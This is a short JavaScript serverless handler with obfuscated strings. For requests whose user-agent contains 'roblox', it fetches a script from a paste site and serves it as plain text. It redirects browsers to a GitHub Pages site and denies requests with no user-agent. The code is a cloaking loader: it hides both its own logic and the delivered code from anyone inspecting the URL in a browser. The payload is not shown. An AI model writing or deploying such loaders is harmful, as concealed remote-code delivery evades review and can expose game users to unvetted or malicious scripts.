export default async function handler(req, res) {
  const _0x3f3c = ['roblox', 'user-agent', 'toLowerCase', 'headers', 'includes', 'Access Denied', 'status', 'send', 'https://pastefy.app/KgJR4al5/raw', 'text/plain', 'Content-Type'];
  const _0x1a2f = function (i) { return _0x3f3c[i]; };

  const ua = req[_0x1a2f(3)][_0x1a2f(1)]?.[_0x1a2f(2)]() || "";
  
  // Check if request is from Roblox
  if (ua[_0x1a2f(4)](_0x1a2f(0))) {
    const gh = await fetch(_0x1a2f(8));
    const sc = await gh.text();

    res.setHeader(_0x1a2f(10), _0x1a2f(9));
    res.send(sc);
  } 
  // If user-agent exists (browser/device), redirect to HTML page
  else if (ua && ua.length > 0) {
    res.writeHead(302, { 'Location': 'https://saputra0231.github.io/' });
    res.end();
  }
  // No user-agent or empty, deny access (potential script/bot)
  else {
    return res[_0x1a2f(6)](403)[_0x1a2f(7)](_0x1a2f(5));
  }
      }
